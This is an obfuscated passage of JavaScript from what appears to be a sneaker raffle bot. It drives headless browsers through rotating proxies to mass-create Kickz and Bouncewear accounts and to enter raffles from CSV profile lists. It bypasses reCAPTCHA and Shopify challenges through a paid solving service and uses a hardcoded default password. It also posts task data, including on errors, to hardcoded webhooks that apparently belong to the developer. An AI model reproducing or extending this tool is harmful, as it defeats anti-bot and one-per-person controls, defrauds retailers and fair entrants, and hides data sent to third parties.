            await _0x1f4682(0x320), await _0x56bd20['select']('#checkout_shipping_address_country', '' + _0x3aa90f[_0x5455cd]['Country']), await _0x56bd20['waitForTimeout'](0x258), await _0x56bd20['type']('#checkout_shipping_address_first_name', '' + _0x3aa90f[_0x5455cd]['FirstName']), await _0x56bd20['waitForTimeout'](0x320), await _0x56bd20['type']('#checkout_shipping_address_last_name', '' + _0x3aa90f[_0x5455cd]['LastName']), await _0x56bd20['waitForTimeout'](0x2bc), await _0x56bd20['type']('#checkout_shipping_address_address1', _0x3aa90f[_0x5455cd]['Address1'] + '\x20' + _0x3aa90f[_0x5455cd]['HouseNumber']), await _0x56bd20['waitForTimeout'](0x2bc), await _0x56bd20['type']('#checkout_shipping_address_address2', '' + _0x3aa90f[_0x5455cd]['Address2']), await _0x56bd20['waitForTimeout'](0x2bc);
            _0x3aa90f[_0x5455cd]['Postcode'] == undefined ? await _0x56bd20['type']('#checkout_shipping_address_zip', '' + _0x3aa90f[_0x5455cd]['Zip']) : await _0x56bd20['type']('#checkout_shipping_address_zip', '' + _0x3aa90f[_0x5455cd]['Postcode']);
            await _0x56bd20['waitForTimeout'](0x2bc), await _0x56bd20['type']('#checkout_shipping_address_city', '' + _0x3aa90f[_0x5455cd]['City']), await _0x56bd20['waitForTimeout'](0x2bc), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x56bd20, _0x56bd20['evaluate'](() => {
                const _0x4c1948 = document['querySelector']('#continue_button');
                for (var _0x2afcc9 = 0x0; _0x2afcc9 < 0x5; _0x2afcc9++) {
                    if (_0x4c1948) {
                        _0x4c1948['click'](), _0x4c1948['click']();
                        break;
                    } else
                        _0x1f4682(0xfa0);
                }
            }), await _0x56bd20['waitForTimeout'](0x1194);
            try {
                await _0x56bd20['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x56bd20['evaluate'](() => {
                const _0x287bb4 = document['querySelector']('#continue_button');
                for (var _0x1c6172 = 0x0; _0x1c6172 < 0x5; _0x1c6172++) {
                    if (_0x287bb4) {
                        _0x287bb4['click']();
                        break;
                    } else
                        _0x1f4682(0xfa0);
                }
            }), await _0x56bd20['waitForTimeout'](0x7d0), console['log'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x56bd20['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x56bd20['evaluate'](() => {
                const _0x2ca1ae = document['querySelector']('#continue_button');
                for (var _0x33d6bd = 0x0; _0x33d6bd < 0x5; _0x33d6bd++) {
                    if (_0x2ca1ae) {
                        _0x2ca1ae['click']();
                        break;
                    } else
                        _0x1f4682(0xfa0);
                }
            }), await _0x56bd20['waitForTimeout'](0x1194), await _0x56bd20['waitForSelector']('#continue_button'), _0x56bd20['evaluate'](() => {
                const _0x2c76ad = document['querySelector']('#continue_button');
                for (var _0x3634b0 = 0x0; _0x3634b0 < 0x5; _0x3634b0++) {
                    if (_0x2c76ad) {
                        _0x2c76ad['click']();
                        break;
                    } else
                        _0x1f4682(0xfa0);
                }
            });
            try {
                await _0x56bd20['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '')
                    try {
                        await _0x10557a(_0x202e3d['webhook'], _0x5e8bc3['succesDEVMSG']);
                    } catch {
                    }
                await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x5e8bc3['succesDEVMSG']), await _0x1f4682(0xc8);
                try {
                    await _0x10557a(_0x146b83, _0x5e8bc3['succesPUBMSG']);
                } catch {
                }
            } catch (_0x4f75d3) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4f75d3));
            }
        } catch (_0x1f6027) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20' + _0x1f6027)), _0x2c7dd8 = '' + _0x1f6027;
            var _0x20be82 = await _0x2221dc(_0x3aa90f[_0x5455cd], _0xca2bd8, 'dev', !![], _0x2c7dd8);
            _0x5e8bc3['errorDEV'] = { 'embeds': [_0x20be82] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x5e8bc3['errorDEV']), await _0x10557a(_0x3df8e6, _0x5e8bc3['errorDEV']), _0x2f4879 = 'yes';
        } finally {
            _0x443064 && _0x443064['close']();
            if (_0x2f4879 == 'yes' && _0xd91b9f != 0x5 && _0x2c7dd8 != 'Size\x20Not\x20Found') {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0xca2bd8['name'] + ']\x20Task\x20' + (_0x5455cd + 0x1) + '\x20:\x20Retrying')), _0x5455cd = _0x5455cd - 0x1, _0xd91b9f = _0xd91b9f + 0x1;
                continue;
            }
            if (_0x5455cd + 0x1 == _0x3aa90f['length']) {
                console['log'](_0xeca352['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x1f4682(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['AfewDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['AfewDelay']);
        }
    }
};
async function _0x37f61f(_0x24fba3, _0x5f3930, _0x2d0093, _0x5cb6fa) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x32d209 = 0x0; _0x32d209 < _0x2d0093['length']; _0x32d209++) {
        var _0x5af353 = '', _0x4749ef = 0x0;
        _0x4dc5fe(_0x5f3930['name'] + '\x20Task\x20' + (_0x32d209 + 0x1) + '\x20/\x20' + _0x2d0093['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8), await _0x2a3946(_0x2d0093, _0x32d209);
        var _0x2e1be2 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }];
        const _0x5b1772 = { 'embeds': _0x2e1be2 };
        var _0x3a9799 = await _0x2221dc(_0x2d0093[_0x32d209], _0x5f3930, 'acc', ![]);
        const _0x17a60d = { 'succesDEVMSG': { 'embeds': [_0x3a9799] } };
        if (_0x2d0093[_0x32d209]['Email'] == '' || _0x2d0093[_0x32d209]['FirstName'] == '' || _0x2d0093[_0x32d209]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x2d0093[_0x32d209]['Password'] == '' && (_0x2d0093[_0x32d209]['Password'] = 'JRaffles23!');
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x551344 = _0x5cb6fa[_0x32d209]['split'](':');
        else
            var _0x1d45c8 = Math['round'](Math['random']() * (_0x5cb6fa['length'] - 0x1)), _0x551344 = _0x5cb6fa[_0x1d45c8]['split'](':');
        const _0x22cdbf = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x551344[0x0] + ':' + _0x551344[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xdf9253 = await _0x22cdbf['newPage']();
            await _0xdf9253['authenticate']({
                'username': '' + _0x551344[0x2],
                'password': '' + _0x551344[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xdf9253['setRequestInterception'](!![]), _0xdf9253['on']('request', _0x3fdcf4 => {
                _0x3fdcf4['resourceType']() === 'image' || _0x3fdcf4['resourceType']() === 'font' || _0x3fdcf4['resourceType']() === 'media' ? _0x3fdcf4['abort']() : _0x3fdcf4['continue']();
            }), await _0xdf9253['goto'](_0x24fba3), await _0x1f4682(0xbb8), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0xdf9253['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xdf9253['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xdf9253['waitForSelector']('#button-register'), await _0x1f4682(0x7d0), await _0xdf9253['evaluate'](() => {
                const _0x2794cb = document['querySelector']('#button-register');
                _0x2794cb['click']();
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x1f4682(0x1388), await _0xdf9253['waitForSelector']('#customer_salutation'), await _0xdf9253['select']('#customer_salutation', 'mr'), await _0x1f4682(0x7d0), await _0xdf9253['waitForSelector']('#customer_firstname'), await _0xdf9253['type']('#customer_firstname', '' + _0x2d0093[_0x32d209]['FirstName']), await _0x1f4682(0x352), await _0xdf9253['waitForSelector']('#customer_lastname'), await _0xdf9253['type']('#customer_lastname', '' + _0x2d0093[_0x32d209]['LastName']), await _0x1f4682(0x352), await _0xdf9253['type']('#email-input', '' + _0x2d0093[_0x32d209]['Email']), await _0x1f4682(0x352), await _0xdf9253['type']('#email-confirm-input', '' + _0x2d0093[_0x32d209]['Email']), await _0x1f4682(0x352), await _0xdf9253['type']('#register-password', '' + _0x2d0093[_0x32d209]['Password']), await _0x1f4682(0x352), await _0xdf9253['type']('#password-confirm', '' + _0x2d0093[_0x32d209]['Password']), await _0x1f4682(0x352), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0xdf9253['click']('#consent'), await _0x1f4682(0x1f4);
            const _0x1b68bd = await _0xdf9253['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x1b68bd) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0xdf9253['click']('#buttonRegister');
            try {
                await _0xdf9253['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Account\x20' + _0x2d0093[_0x32d209]['Email'] + '\x20Generated!')), console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x2d0093[_0x32d209]['Email'])), await _0x1f4682(0x4b0);
            async function _0x4b1cb9() {
                console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x20b68d = await _0x2086bb['get']('Code');
                return _0x20b68d['Code'];
            }
            ;
            code = await _0x4b1cb9(), _0x1f4682(0x320), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Verifying..'), await _0xdf9253['type']('#verificationCode', code), await _0x1f4682(0x1f4), await _0xdf9253['click']('#buttonVerify'), await _0x1f4682(0x190), await _0xdf9253['click']('#buttonVerify'), await _0x1f4682(0x3e8);
            try {
                await _0xdf9253['waitForSelector']('div.b-user_greeting'), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Account\x20' + _0x2d0093[_0x32d209]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x1da89f['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x2d0093[_0x32d209]['Email'] + ',' + _0x2d0093[_0x32d209]['Password'] + ','), console['log'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Account\x20' + _0x2d0093[_0x32d209]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x17a60d['succesDEVMSG']);
                } catch {
                }
                await _0x10557a(_0x16cb69, _0x17a60d['succesDEVMSG']);
            } catch {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x34fd0c) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20' + _0x34fd0c)), _0x2e1be2[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2e1be2[0x0]['description'] = '' + _0x34fd0c, await _0x10557a(_0x3df8e6, _0x5b1772), _0x5af353 = 'yes';
        } finally {
            _0x22cdbf && _0x22cdbf['close']();
            if (_0x5af353 == 'yes' && _0x4749ef != 0x5) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x5f3930['name'] + ']\x20Task\x20' + (_0x32d209 + 0x1) + '\x20:\x20Retrying')), _0x32d209 = _0x32d209 - 0x1, _0x4749ef = _0x4749ef + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['delay'] + '\x20ms'), await _0x1f4682(_0x202e3d['delay']);
        }
    }
}
async function _0x5388e4(_0x59eb0b, _0x3e227a, _0x525ab2) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1182af = 0x0; _0x1182af < _0x3e227a['length']; _0x1182af++) {
        var _0x596939, _0x5079e1 = '', _0x18aedb = 0x0;
        _0x4dc5fe(_0x59eb0b['name'] + '\x20Task\x20' + (_0x1182af + 0x1) + '\x20/\x20' + _0x3e227a['length'] + '\x20||\x20File:\x20' + _0x3733f2 + '\x20Proxies:\x20' + _0xc68ec8);
        var _0x4fbbad = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x1b651e
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3e227a[_0x1182af]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3e227a[_0x1182af]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x202e3d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49eea2
                }
            ]
        }], _0x4c7156 = await _0x2221dc(_0x3e227a[_0x1182af], _0x59eb0b, 'dev', ![]), _0x3c9508 = await _0x2221dc(_0x3e227a[_0x1182af], _0x59eb0b, 'pub', ![]);
        const _0x4011b4 = {
            'succesDEVMSG': { 'embeds': [_0x4c7156] },
            'succesPUBMSG': { 'embeds': [_0x3c9508] }
        };
        await _0x2a3946(_0x3e227a, _0x1182af);
        if (_0x3e227a[_0x1182af]['Email'] == '' || _0x3e227a[_0x1182af]['Password'] == '' || _0x3e227a[_0x1182af]['FirstName'] == '' || _0x3e227a[_0x1182af]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x5c2420 = _0x525ab2[_0x1182af]['split'](':');
        else
            var _0x4cc37d = Math['round'](Math['random']() * (_0x525ab2['length'] - 0x1)), _0x5c2420 = _0x525ab2[_0x4cc37d]['split'](':');
        const _0x124b94 = await _0x3d4a9f['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x5c2420[0x0] + ':' + _0x5c2420[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xa105fd = await _0x124b94['newPage']();
            await _0xa105fd['authenticate']({
                'username': '' + _0x5c2420[0x2],
                'password': '' + _0x5c2420[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa105fd['setRequestInterception'](!![]), _0xa105fd['on']('request', _0x17188c => {
                _0x17188c['resourceType']() === 'image' || _0x17188c['resourceType']() === 'font' || _0x17188c['resourceType']() === 'media' ? _0x17188c['abort']() : _0x17188c['continue']();
            }), await _0xa105fd['goto']('' + _0x3e227a[_0x1182af]['Url'], { 'waitUntil': 'networkidle2' }), await _0x1f4682(0x12c);
            try {
                await _0xa105fd['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0xa105fd['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Logging\x20in'), await _0xa105fd['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa105fd['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xa105fd['waitForSelector']('#username'), await _0xa105fd['type']('#username', _0x3e227a[_0x1182af]['Email']), await _0xa105fd['waitForSelector']('#password'), await _0xa105fd['type']('#password', _0x3e227a[_0x1182af]['Password']), await _0x1f4682(0x190), await _0xa105fd['click']('#buttonSubmit'), await _0xa105fd['waitForSelector']('div.b-user_greeting'), console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Getting\x20Product'), await _0x1f4682(0x1f4), await _0xa105fd['goto']('' + _0x3e227a[_0x1182af]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3e227a[_0x1182af]['Size']);
            let _0x3cd359 = _0x3e227a[_0x1182af]['Size']['replace']('.5', '\x201/2');
            await _0xa105fd['click']('button[title=\x22' + _0x3cd359 + '\x22]'), await _0x1f4682(0x1f4);
            try {
                await _0xa105fd['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x1f4682(0x12c), console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Filling\x20Information'), await _0xa105fd['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_firstName', _0x3e227a[_0x1182af]['FirstName']), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_lastName', _0x3e227a[_0x1182af]['LastName']), await _0x1f4682(0x12c), await _0xa105fd['select']('#dwfrm_raffle_addressFields_country', _0x3e227a[_0x1182af]['Country']), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_city', _0x3e227a[_0x1182af]['City']), await _0x1f4682(0x12c);
            _0x3e227a[_0x1182af]['Postcode'] == undefined && (_0x3e227a[_0x1182af]['Postcode'] = _0x3e227a[_0x1182af]['Zip']);
            await _0xa105fd['type']('#dwfrm_raffle_addressFields_postalCode', _0x3e227a[_0x1182af]['Postcode']), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_address1', _0x3e227a[_0x1182af]['Address1']), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_address2', _0x3e227a[_0x1182af]['HouseNumber']), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x3e227a[_0x1182af]['Address2']), await _0x1f4682(0x12c), await _0xa105fd['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x1f4682(0x12c), await _0xa105fd['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x3e227a[_0x1182af]['Follower']), await _0x1f4682(0x1f4), await _0xa105fd['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x1f4682(0x1f4), console['log'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20' + _0xeca352['blue']('Awaiting\x20Paypal\x20Payment')), await _0xa105fd['click']('.b-paypal_button');
            try {
                await _0xa105fd['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x4011b4['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x16dc96, _0x4011b4['succesDEVMSG']), await _0x1f4682(0xc8), await _0x10557a(_0x146b83, _0x4011b4['succesPUBMSG']);
            } catch (_0x3aa8dc) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x3aa8dc)), _0x596939 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x3aa8dc;
                var _0x1f5ab3 = await _0x2221dc(_0x3e227a[_0x1182af], _0x59eb0b, 'dev', !![], _0x596939);
                _0x4011b4['errorDEV'] = { 'embeds': [_0x1f5ab3] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x4011b4['errorDEV']), await _0x10557a(_0x3df8e6, _0x4011b4['errorDEV']);
            }
        } catch (_0x53f434) {
            console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20' + _0x53f434)), _0x596939 = '' + _0x53f434;
            var _0x1f5ab3 = await _0x2221dc(_0x3e227a[_0x1182af], _0x59eb0b, 'dev', !![], _0x596939);
            _0x4011b4['errorDEV'] = { 'embeds': [_0x1f5ab3] }, _0x202e3d['webhook'] != undefined && _0x202e3d['webhook'] != '' && await _0x10557a(_0x202e3d['webhook'], _0x4011b4['errorDEV']), await _0x10557a(_0x3df8e6, _0x4011b4['errorDEV']), _0x5079e1 = 'yes';
        } finally {
            _0x124b94 && _0x124b94['close']();
            if (_0x5079e1 == 'yes' && _0x18aedb != 0x5) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x59eb0b['name'] + ']\x20Task\x20' + (_0x1182af + 0x1) + '\x20:\x20Retrying')), _0x1182af = _0x1182af - 0x1, _0x18aedb = _0x18aedb + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x202e3d['AfewDelay'] + '\x20ms'), await _0x1f4682(_0x202e3d['AfewDelay']);
        }
    }
}
async function _0xf7182c(_0x2c3ca4, _0x393e6c) {
    _0x3d4a9f['use'](_0x42d8ce()), _0x3d4a9f['use'](_0x484dec({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x202e3d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3ff9a4 = 0x0; _0x3ff9a4 < bouncewear['length']; _0x3ff9a4++) {
        await _0x2a3946(bouncewear, _0x3ff9a4);
        if (bouncewear[_0x3ff9a4]['Email'] == '' || bouncewear[_0x3ff9a4]['Password'] == '' || bouncewear[_0x3ff9a4]['FirstName'] == '' || bouncewear[_0x3ff9a4]['LastName'] == '') {
            console['log'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x202e3d['useRandomProxy'] = ![])
            var _0x3e0b03 = _0x52bbf1()[_0x3ff9a4]['split'](':');
        else
            var _0x5afd87 = Math['round'](Math['random']() * (_0x52bbf1()['length'] - 0x1)), _0x3e0b03 = _0x52bbf1()[_0x5afd87]['split'](':');
        const _0x1b4362 = await _0x3d4a9f['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3e0b03[0x0] + ':' + _0x3e0b03[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x112360 = await _0x1b4362['newPage']();
            await _0x112360['authenticate']({
                'username': '' + _0x3e0b03[0x2],
                'password': '' + _0x3e0b03[0x3]
            }), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x112360['setRequestInterception'](!![]), _0x112360['on']('request', _0x226185 => {
                _0x226185['resourceType']() === 'image' || _0x226185['resourceType']() === 'font' || _0x226185['resourceType']() === 'media' ? _0x226185['abort']() : _0x226185['continue']();
            }), await _0x112360['goto'](_0x2c3ca4), await _0x1f4682(0xbb8), await _0x112360['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Filling\x20information'), await _0x112360['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3ff9a4]['FirstName']), await _0x1f4682(0x226), await _0x112360['type']('#RegisterForm-LastName', '' + bouncewear[_0x3ff9a4]['LastName']), await _0x1f4682(0x226), await _0x112360['type']('#RegisterForm-email', '' + bouncewear[_0x3ff9a4]['Email']), await _0x1f4682(0x226), await _0x112360['type']('#RegisterForm-password', '' + bouncewear[_0x3ff9a4]['Password']), await _0x1f4682(0x226), await _0x112360['click']('#marketing'), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Submitting..'), await _0x112360['$eval']('#RegisterForm', _0x554b65 => _0x554b65['submit']()), await _0x1f4682(0x1f40), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x112360['solveRecaptchas'](), await _0x112360['click']('.shopify-challenge__button.btn');
            async function _0x3a72f6() {
                for (var _0x465dc6 = 0x0; _0x465dc6 < 0x4; _0x465dc6++) {
                    try {
                        console['log']('try'), await _0x112360['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20' + _0xeca352['red']('Catpcha\x20failed,\x20retrying..')), await _0x112360['solveRecaptchas'](), await _0x112360['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x3a72f6(), console['log'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1f4682(0x1f4);
            try {
                await _0x112360['waitForSelector']('.featured-title'), await _0x1f4682(0x1f4), console['log'](_0xeca352['green'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3ff9a4]['Email'] + '\x20Generated!')), _0x1da89f['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3ff9a4]['Email'] + ',' + bouncewear[_0x3ff9a4]['Password']), console['log'](_0xeca352['yellow'](_0x3a3ee9() + '\x20[' + _0x393e6c['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3ff9a4]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x5097d9) {
                console['log'](_0xeca352['red'](_0x3a3ee9() + '\x20[' + _0x1b0085[taskModule]['name'] + ']\x20Task\x20' + (_0x3ff9a4 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x5097d9));
            }
        } catch (_0xeb7d29) {
